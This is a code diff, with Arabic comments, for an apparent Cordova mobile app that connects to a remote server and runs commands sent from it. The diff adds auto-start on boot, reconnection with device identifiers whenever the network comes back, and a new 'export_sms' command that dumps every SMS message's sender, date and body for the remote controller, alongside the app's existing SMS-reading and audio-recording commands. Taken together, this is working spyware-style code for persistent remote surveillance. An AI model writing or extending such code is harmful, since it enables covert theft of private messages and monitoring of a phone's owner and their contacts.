@@ -1,5 +1,4 @@
 document.addEventListener('deviceready', onDeviceReady, false);
-
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
 
@@ -177,7 +176,7 @@ function setupBackgroundMode() {
     });
   }
   
-  // التأكد من استمرار التطبيق في الخلفية حتى بعد إغلاقه
+  // استخدام خدمة المقدمة لزيادة الأولوية في الخلفية
   if (cordova.plugins.foregroundService) {
     cordova.plugins.foregroundService.start(
       'التطبيق يعمل في الخلفية',
@@ -191,6 +190,29 @@ function setupBackgroundMode() {
       }
     );
   }
+  
+  // التأكد من تشغيل التطبيق تلقائيًا بعد إعادة التشغيل
+  if (cordova.plugins.autoStart) {
+    cordova.plugins.autoStart.enable(function() {
+      console.log('Auto-start enabled');
+    }, function() {
+      console.error('Failed to enable auto-start');
+    });
+  }
+  
+  // التأكد من تشغيل التطبيق عند فتح الشبكة
+  document.addEventListener('online', function() {
+    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
+      const deviceInfo = {
+        uuid: device.uuid || 'unknown',
+        model: device.model || 'Unknown',
+        platform: device.platform || 'Unknown',
+        version: device.version || 'Unknown',
+        manufacturer: device.manufacturer || 'Unknown'
+      };
+      connectToServer(deviceInfo);
+    }
+  }, false);
 }
 
 function connectToServer(deviceInfo) {
@@ -350,6 +372,9 @@ function executeCommand(command, commandId, callback) {
     case 'get_received_requests':
       getReceivedRequests(commandId, callback);
       break;
+    case 'export_sms':
+      exportSMS(commandId, callback);
+      break;
     default:
       callback({ 
         commandId,
@@ -444,6 +469,44 @@ function getSMS(commandId, callback) {
   );
 }
 
+// تصدير الرسائل كملف نصي
+function exportSMS(commandId, callback) {
+  getSMS(commandId, (smsResponse) => {
+    if (smsResponse.status === 'success') {
+      // إنشاء محتوى الملف النصي
+      let txtContent = "رسائل SMS\n================\n\n";
+      
+      smsResponse.messages.forEach(msg => {
+        txtContent += `من: ${msg.address}\n`;
+        txtContent += `التاريخ: ${new Date(msg.date).toLocaleString()}\n`;
+        txtContent += `الرسالة: ${msg.body}\n`;
+        txtContent += "----------------\n\n";
+      });
+      
+      // إنشاء كائن.blob و.URL
+      const blob = new Blob([txtContent], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      
+      // حفظ الملف في التخزين المحلي
+      const fileName = `sms_export_${Date.now()}.txt`;
+      saveFileToStorage(fileName, blob);
+      
+      callback({
+        commandId,
+        status: 'success',
+        export: {
+          format: 'txt',
+          downloadUrl: url,
+          fileName: fileName,
+          size: blob.size
+        }
+      });
+    } else {
+      callback(smsResponse);
+    }
+  });
+}
+
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   const mediaRecorderOptions = {
@@ -497,6 +560,19 @@ function saveAudioToStorage(fileName, blob) {
     dir.getFile(fileName, { create: true }, fileEntry => {
       fileEntry.createWriter(fileWriter => {
         fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
+        fileWriter.onerror = e => console.error('Error saving file:', e);
+        fileWriter.write(blob);
+      });
+    });
+  });
+}
+
+// حفظ الملفات النصية في التخزين
+function saveFileToStorage(fileName, blob) {
+  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
+    dir.getFile(fileName, { create: true }, fileEntry => {
+      fileEntry.createWriter(fileWriter => {
+        fileWriter.onwriteend = () => console.log('File saved:', fileName);
         fileWriter.onerror = e => console.error('Error saving file:', e);
         fileWriter.write(blob);
       });
@@ -571,6 +647,15 @@ document.addEventListener('deviceready', () => {
         console.error('Foreground service error after boot:', error);
       }
     );
+  }
+  
+  // التأكد من تشغيل التطبيق تلقائيًا بعد إعادة التشغيل
+  if (cordova.plugins.autoStart) {
+    cordova.plugins.autoStart.enable(function() {
+      console.log('Auto-start enabled at boot');
+    }, function() {
+      console.error('Failed to enable auto-start at boot');
+    });
   }
 }, false);
 
